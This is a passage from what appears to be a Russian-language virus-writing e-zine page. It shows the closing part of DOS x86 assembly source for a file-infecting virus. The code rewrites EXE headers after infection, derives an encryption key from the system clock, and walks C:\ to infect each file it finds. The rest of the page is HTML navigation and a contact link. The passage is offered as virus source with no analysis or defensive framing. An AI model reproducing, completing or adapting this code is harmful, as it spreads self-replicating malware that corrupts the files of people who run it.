and bh,0feh<br>
mov ah,bh<br>
mov cl,9<br>
ror ax,cl<br>
mov pagecnt,ax<br>
mov ah,Move_H<br>
mov al,Move_L<br>
<br>
mov bx,Signature ;восстановить сигнатуру<br>
inc bx<br>
mov Signature,bx<br>
<br>
mov bx,HANDle<br>
xor cx,cx<br>
xor dx,dx<br>
int 21h ;установить указатель в начало
программы<br>
mov ah,Write_Func<br>
lea dx,[HDR]<br>
mov cx,len_hdr<br>
int 21h ;записать заголовок<br>
<br>
QUITER_FROM_WREXE:<br>
db 61h<br>
ret<br>
;---------------------------------------------------<br>
new_code:<br>
db 60h<br>
mov ah,Time_F<br>
int 21h<br>
xor cx,dx<br>
xor ch,cl<br>
mov byte ptr [SECRET+1],ch ;Поместить ключ для
использования<br>
db 61h<br>
ret<br>
<br>
;---------------------------------------------------<br>
Dos_V db 30h<br>
SetDTA_Func db 1ah<br>
GetDTA_Func db 2fh<br>
FindFirst db 4eh<br>
FindNext db 4fh<br>
GetAttr_F dw 4300h<br>
SetAttr_F dw 4301h<br>
Open_F dw 3d02h<br>
GetDate_F dw 5700h<br>
SetDate_F dw 5701h<br>
Close_F db 3eh<br>
Move_H db 42h<br>
Move_L db 00h<br>
All_Attr dw 00ffh<br>
Read_F db 3fh<br>
Ofs_N db 1eh<br>
Time_F db 2ch<br>
Ident_E dw 9619h<br>
Offs_N dw 001eh<br>
Sig_E dw 5a4dh<br>
names_files db 'c:\'<br>
db 12 dup (?)<br>
db 0h<br>
;---------------------------------------------------<br>
command_com:<br>
mov dx, offset COMAND_C<br>
call RARITET<br>
mov dx, offset COMAND_E<br>
call RARITET<br>
mov dx, offset COMAND_A<br>
call RARITET<br>
ret<br>
RARITET:<br>
cld<br>
mov ah,FindFirst<br>
mov cx,All_Attr<br>
INTERR:<br>
int 21h<br>
jb N_FILE<br>
mov ah,GetDTA_Func<br>
int 21h<br>
add bx,Offs_N<br>
S_0:<br>
mov di, offset names_files + 3<br>
mov si,bx<br>
mov cx,13<br>
rep movsb<br>
S_1:<br>
mov bx, offset names_files<br>
call PLAQ_1<br>
mov ah,FindNext<br>
jmp short INTERR<br>
N_FILE:<br>
ret<br>
;---------------------------------------------------<br>
<br>
VIRLEN Equ $-START<br>
SECRET_LEN EQU $-GET_DOS_VERSION<br>
NEWDTA label byte<br>
cseg ends<br>
end start<br>
</strong></font><font color="#FF0000" size="4"><strong><br>
</strong></font><font color="#FF0000" size="3"><strong></strong></font></p>

<p align="center"><a href="../TNO#2_start.htm"><img
src="../images/14ic3.gif" border="0" width="60" height="65"></a></p>

<p align="center"><a href="mailto:nrgteam@mail.ru"><img
src="../images/coollogo_com_7565375.jpg" border="0" width="206"
height="53"></a></p>
</body>
</html>
